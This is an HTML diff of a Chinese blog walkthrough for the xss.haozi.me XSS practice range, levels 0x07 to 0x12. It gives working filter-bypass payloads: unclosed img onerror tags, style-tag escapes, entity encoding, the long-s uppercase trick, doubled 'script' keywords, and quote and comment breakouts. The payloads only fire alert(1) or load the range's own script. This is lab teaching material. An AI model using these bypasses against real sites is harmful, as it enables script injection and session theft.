-<p><img src="https://img-blog.csdnimg.cn/af91c883da0548268d88ace406e7aefd.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a><strong>0x07</strong></h2><p><img src="https://img-blog.csdnimg.cn/f4cdcdb362764892a02db14e0ccabd68.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/af91c883da0548268d88ace406e7aefd.png" alt="在这里插入图片描述"></p>
+<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a><strong>0x07</strong></h2><p><img src="https://img-blog.csdnimg.cn/f4cdcdb362764892a02db14e0ccabd68.png" alt="在这里插入图片描述"></p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">这题也是正则表达式,  将匹配到的替换为空:<br>分析正则表达式: <br> <span class="hljs-regexp">/&lt;\/?[^&gt;]+&gt;/gi</span><br><br>这里分为三部分来分析:  <span class="hljs-regexp">/&lt;\/?[^&gt;]+&gt;/gi</span><br>&lt;\/?<br>   \转义符与<span class="hljs-regexp">/结合,  从而转义了/</span>, 进而含义是匹配:  &lt;/<br>   再加上+ (匹配前面的子表达式一次或多次), 所以是匹配: &lt; 或者 &lt;/<br>[^&gt;]+<br>   首先要明白,  中括号的用法:  [abc] =&gt; 匹配abc中的任意一个;  <br>   然后^符号的两种用法:<br>    <span class="hljs-number">1</span>.  限定开头:  比如， <span class="hljs-regexp">/^A/</span>会匹配<span class="hljs-string">&quot;An e&quot;</span>中的A，但是不会匹配<span class="hljs-string">&quot;ab A&quot;</span>中的A<br>    <span class="hljs-number">2</span>.  取反(仅处于中括号中成立):　比如，[^a-zA-Z0-<span class="hljs-number">9</span>]表示　“找到一个非字母也非数字的字符”。 <br>　最后是＋的含义：匹配前面的子表达式一次或多次。<br>　所以，总的来说，[^&gt;]+　匹配了除了＾的任意字符的一次或者多次<br>&gt;<br>　单纯匹配＞。<br>总的表达式就是，匹配:  &lt;<span class="hljs-regexp">/ 任意字符 &gt;,  而且 /i</span> 过滤了大小写<br>匹配了尖括号&lt;&gt;开头结尾的字符串替换为空.可以通过少输入一个&gt;来绕过正则,但仍然可以执行.<br></code></pre></td></tr></table></figure>
 
 <p>&lt;img src&#x3D;”x” onerror&#x3D;”alert(1)”</p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/badaf2fc3d6d483fad4e5f14f75d0034.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a><strong>0x08</strong></h2><p><img src="https://img-blog.csdnimg.cn/8f72a6406a674360a3e203d852b9418c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/badaf2fc3d6d483fad4e5f14f75d0034.png" alt="在这里插入图片描述"></p>
+<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a><strong>0x08</strong></h2><p><img src="https://img-blog.csdnimg.cn/8f72a6406a674360a3e203d852b9418c.png" alt="在这里插入图片描述"></p>
 <p>正则过滤了: </style>，那么可以通过多加一个空格, 造成正则逃逸</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;/style &gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/ed5505874876496aabac72155be09a78.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/ed5505874876496aabac72155be09a78.png" alt="在这里插入图片描述"></p>
 <p>或者也可以利用正则式不能匹配空格来绕过:</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;/style<br>&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/b64caa553aa0480b86832cdf364f36ac.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a><strong>0x09</strong></h2><p><img src="https://img-blog.csdnimg.cn/0b0a177a0e5a46c3ba4164504b4f0b86.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/b64caa553aa0480b86832cdf364f36ac.png" alt="在这里插入图片描述"></p>
+<h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a><strong>0x09</strong></h2><p><img src="https://img-blog.csdnimg.cn/0b0a177a0e5a46c3ba4164504b4f0b86.png" alt="在这里插入图片描述"></p>
 <p>这题正则表达式白名单式地匹配了固定网址:</p>
 <p>我们可以通过在正确的网址后面继续做文章, 说白了就是输入的xss中必须包含指定网址就可以了;</p>
 <p>在com后面多加字符, 再把前面的双引号闭合, 再输入onerror错误事件:</p>
 <p><code>https://www.segmentfault.com1&quot; onerror=alert(1) </code></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/5333082b528b45829bcd224746c91d8c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/5333082b528b45829bcd224746c91d8c.png" alt="在这里插入图片描述"></p>
 <p>或者</p>
 <p><code>https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;img src=&quot;&quot; onerror=&quot;alert(1)</code></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/77122868656d4a7ab1f58d6300bc10c4.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a><strong>0x0A</strong></h2><p><img src="https://img-blog.csdnimg.cn/41dc135e85c341068b68d534eec361a7.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/77122868656d4a7ab1f58d6300bc10c4.png" alt="在这里插入图片描述"></p>
+<h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a><strong>0x0A</strong></h2><p><img src="https://img-blog.csdnimg.cn/41dc135e85c341068b68d534eec361a7.png" alt="在这里插入图片描述"></p>
 <p>通过html转义, 把能注入的关键字都过滤了:</p>
 <p>可以直接引用指定网站下的目录文件来达到xss注入的目的,</p>
 <p>比如: 在靶场的目录下有个j.js文件, 里面有alert(1);代码, 直接调用即可:</p>
 <p><a target="_blank" rel="noopener" href="https://www.segmentfault.com.haozi.me/j.js">https://www.segmentfault.com.haozi.me/j.js</a></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/91bd633e06cd481aa6b56a63e22ffaec.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a><strong>0x0B</strong></h2><p><img src="https://img-blog.csdnimg.cn/c8aec5696909429a94d4e86df9c9b836.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/91bd633e06cd481aa6b56a63e22ffaec.png" alt="在这里插入图片描述"></p>
+<h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a><strong>0x0B</strong></h2><p><img src="https://img-blog.csdnimg.cn/c8aec5696909429a94d4e86df9c9b836.png" alt="在这里插入图片描述"></p>
 <p>程序将所有字母转换为大写:这里需要明白的一点是HTML中对大小写不敏感，JS中对大小写敏感</p>
 <p> 对js代码进行编码处理, 而html部分不变</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span>&amp;</span></span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/b3a72b4c110642c998ec65b67dfd5877.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/b3a72b4c110642c998ec65b67dfd5877.png" alt="在这里插入图片描述"></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/b62fcf3eae6e4eb98446c9296b7a608d.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/b62fcf3eae6e4eb98446c9296b7a608d.png" alt="在这里插入图片描述"></p>
 <p>另一种方法是: </p>
 <p>域名对大小写也不敏感 , 所有可以用上一题的方法, 调用靶机上自带的j.js代码, 完成xss注入:</p>
 <p><code>&lt;script src=https://www.segmentfault.com.haozi.me/j.js&gt;&lt;/script&gt;</code></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/c5bda272b58043ec99f468440b1f72a8.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/c5bda272b58043ec99f468440b1f72a8.png" alt="在这里插入图片描述"></p>
 <h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a><strong>0x0C</strong></h2><p>这题和上一题相比, 只是多了一个对script的过滤, 用上一题的第一种方法即可:</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>;ert(1)&quot;&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>;<span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#41;</span>&quot;&gt;<br></code></pre></td></tr></table></figure>
 
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/183b85af1b514a2093b5f1163ff00811.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/183b85af1b514a2093b5f1163ff00811.png" alt="在这里插入图片描述"></p>
 <p>第二种方法也可以, 思路和sql注入类似，发现script被替换为空, 那么可以前后进行畸形构造:</p>
 <p><code>&lt;sscriptcript src=https://www.segmentfault.com.haozi.me/j.js&gt;&lt;/sscriptcript&gt;</code></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/d0317142dc924657896c6a5cb235b217.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a><strong>0x0D</strong></h2><p><img src="https://img-blog.csdnimg.cn/7a6028639a95475c92bd46e8cfbc00fc.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/d0317142dc924657896c6a5cb235b217.png" alt="在这里插入图片描述"></p>
+<h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a><strong>0x0D</strong></h2><p><img src="https://img-blog.csdnimg.cn/7a6028639a95475c92bd46e8cfbc00fc.png" alt="在这里插入图片描述"></p>
 <p>把斜杠, 单、双引号都过滤了:</p>
 <p>回车可以破坏注释结构:</p>
-<p><img src="https://img-blog.csdnimg.cn/ac0941137e7a47b1ab3106201ec5aa57.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/ac0941137e7a47b1ab3106201ec5aa57.png" alt="在这里插入图片描述"></p>
 <p>直接注入alert(1), 再配合js的注释符 –&gt; 注释掉’):</p>
 <figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"> <br><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>);<br>--&gt;<br></code></pre></td></tr></table></figure>
 
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/5773db80a16b4732a4dde27fb9036ad4.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h2 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a><strong>0x0E</strong></h2><p><img src="https://img-blog.csdnimg.cn/4ba1b7f711394a06943f15aad7c33ff3.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/5773db80a16b4732a4dde27fb9036ad4.png" alt="在这里插入图片描述"></p>
+<h2 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a><strong>0x0E</strong></h2><p><img src="https://img-blog.csdnimg.cn/4ba1b7f711394a06943f15aad7c33ff3.png" alt="在这里插入图片描述"></p>
 <p>正则匹配的意思是，将尖括号后面追加一个下划线, 并且将所有字符大写:</p>
 <p>比如:  &lt;a   变为:  &lt;_A</p>
 <p>这几乎过滤了所有标签, 包括<code>&lt;script&gt;</code>, 匹配了所有&lt;与字母的组合.即&lt;s无法使用.</p>
 <p>找到一个字符的大写是s的: ſ (古英文, 拉丁文):且其ascii值不与s相等,因此可以绕过.</p>
 <p><code>&lt;ſcript src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;&lt;/script&gt;</code></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/b8ff56e235014cd3bcc0b512ecfae6a3.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a><strong>0x0F</strong></h2><p><img src="https://img-blog.csdnimg.cn/bdd09952675f434ba079ab1e81ede0b0.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/b8ff56e235014cd3bcc0b512ecfae6a3.png" alt="在这里插入图片描述"></p>
+<h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a><strong>0x0F</strong></h2><p><img src="https://img-blog.csdnimg.cn/bdd09952675f434ba079ab1e81ede0b0.png" alt="在这里插入图片描述"></p>
 <p>对一些常用的注入字符进行了html编码处理:</p>
 <p>但是, 它忽略了一点, 由于编码后处于html标签中, 所以当解析代码的时候, 被过滤编码的字符仍然会被还原来执行, 所以可以说, 被过滤的字符可以用</p>
 <p>注入使其闭合, 在注释掉后面的内容即可:</p>
 <p><code>&#39;); alert(1); //</code></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/6f74e40bae424685b829a97701208b59.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/6f74e40bae424685b829a97701208b59.png" alt="在这里插入图片描述"></p>
 <p>或者也可闭合后面的单引号:</p>
 <p><code>&#39;); alert(&#39;1</code></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/60d8fe39493a40429fe180f4b085fa38.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/60d8fe39493a40429fe180f4b085fa38.png" alt="在这里插入图片描述"></p>
 <h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><p>没有过滤, 随意给window.date一个值, 再注入:</p>
 <p><code>&#39;&#39;; alert(1);</code></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/e0e52c48d8da45cea1ff892e6cbb5a00.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a><strong>0x11</strong></h2><p><img src="https://img-blog.csdnimg.cn/c440085de51a418faa34eed086d6f3f6.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/e0e52c48d8da45cea1ff892e6cbb5a00.png" alt="在这里插入图片描述"></p>
+<h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a><strong>0x11</strong></h2><p><img src="https://img-blog.csdnimg.cn/c440085de51a418faa34eed086d6f3f6.png" alt="在这里插入图片描述"></p>
 <p>发现所有一些字符被转义了, 就连换行符等也被转义了:</p>
 <p>但是发现竟然还可以用….原因是: </p>
 <p>&#x2F;&#x2F;虽然被转义成了//, 但转义之后还是&#x2F;&#x2F;, 在js中还是注释符 (勿与正则弄混) </p>
 <p><code>&quot;); alert(1); //</code></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/5c5e1ae1d54242a58ba221c3ea1c404d.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/5c5e1ae1d54242a58ba221c3ea1c404d.png" alt="在这里插入图片描述"></p>
 <p>或者:</p>
 <p><code>&quot;); alert(&quot;1</code></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/e044338d8ced4f1fb615fb90c25f4653.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a><strong>0x12</strong></h2><p><img src="https://img-blog.csdnimg.cn/07bf0e39403e468886debe75ec0c4962.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/e044338d8ced4f1fb615fb90c25f4653.png" alt="在这里插入图片描述"></p>
+<h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a><strong>0x12</strong></h2><p><img src="https://img-blog.csdnimg.cn/07bf0e39403e468886debe75ec0c4962.png" alt="在这里插入图片描述"></p>
 <p>这题将双引号转义了, 就不能好好闭合了:但是, 换个思路, 它并没有将转义符转义, 那么我们可以将转义符转义:</p>
 <figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">\&quot;); <span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>
 
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/1a4ddfe30f9f4a0e8b1fc487866f8c9f.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/1a4ddfe30f9f4a0e8b1fc487866f8c9f.png" alt="在这里插入图片描述"></p>
 <p>另外一个答案</p>
 <p>通过闭合前面的script标签, 内嵌一个script标签即可:</p>
 <p><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;</code></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/dbd35f5cf59647e0a089fe1c47524873.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/dbd35f5cf59647e0a089fe1c47524873.png" alt="在这里插入图片描述"></p>
 <p>文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。</p>
 <p>免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。</p>
 <p>转载声明：儒道易行 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。</p>
@@ -506,364 +327,4 @@
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTU2NjA1Mw==&action=getalbum&album_id=1696286248027357190&scene=173&from_msgid=2247485408&from_itemidx=1&count=3&nolastread=1#wechat_redirect">https://mp.weixin.qq.com/mp/appmsgalbum?__biz&#x3D;Mzg5NTU2NjA1Mw&#x3D;&#x3D;&amp;action&#x3D;getalbum&amp;album_id&#x3D;1696286248027357190&amp;scene&#x3D;173&amp;from_msgid&#x3D;2247485408&amp;from_itemidx&#x3D;1&amp;count&#x3D;3&amp;nolastread&#x3D;1#wechat_redirect</a></p>
 <p>FreeBuf：</p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85">https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85</a></p>
-
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>xss.haozi.me通关教程</div>
-      <div>http://rdyx0.github.io/2019/10/20/xss.haozi.me通关教程/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>儒道易行</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2019年10月20日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2019/10/21/XSS%20Challenges%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" title="XSS Challenges通关教程">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">XSS Challenges通关教程</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2019/10/19/DSVW%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" title="DSVW通关教程">
-                        <span class="hidden-mobile">DSVW通关教程</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://github.com/rdyx0" target="_blank" rel="nofollow noopener"><span>儒道易行</span></a> 
-    </div>
-  
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="busuanzi_container_site_pv" style="display: none">
-        总访问量 
-        <span id="busuanzi_value_site_pv"></span>
-         次
-      </span>
-    
-    
-      <span id="busuanzi_container_site_uv" style="display: none">
-        总访客数 
-        <span id="busuanzi_value_site_uv"></span>
-         人
-      </span>
-    
-    
-  
-</div>
-
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script  src="/js/local-search.js" ></script>
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
